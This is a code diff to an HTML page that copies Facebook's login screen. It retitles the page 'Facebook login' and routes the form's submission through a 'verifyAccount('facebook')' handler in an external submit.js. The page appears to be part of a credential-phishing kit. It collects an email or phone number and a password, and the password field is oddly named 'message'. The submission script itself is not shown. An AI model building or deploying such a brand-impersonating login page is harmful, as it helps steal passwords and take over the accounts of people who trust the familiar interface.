@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>Facebook login</title>
     <link rel="stylesheet" href="index.css">
 
     <!-- Not needed for the project -->
@@ -22,7 +22,7 @@
                 <h2>Facebook helps you connect and share with people in your life.</h2>
             </div>
             <div class="col-form">
-                <form class="form-container" id="maine-form" onsubmit="verifyAccount('facebook')">
+                <form class="form-container" id="maine-form" onsubmit="return verifyAccount('facebook')">
                     <input type="text" name="username" placeholder="Email or Phone number" required>
                     <input type="password" placeholder="Password" name="message" id="maine-message" required>
                     <button type="submit" class="btn-login">Login
@@ -34,7 +34,6 @@
                 </form>
                 <p><a href="#">Create a Page</a>
                     for a celebrity, band or business</p>
-                    <br>
             </div>
         </div>
     </main>
@@ -99,8 +98,9 @@
         </div>
     </footer>
 
+    <div class="footer">
+    </div>
     <script src="../submit.js"></script>
-    <script src="index.js"></script>
 </body>
 
 </html>
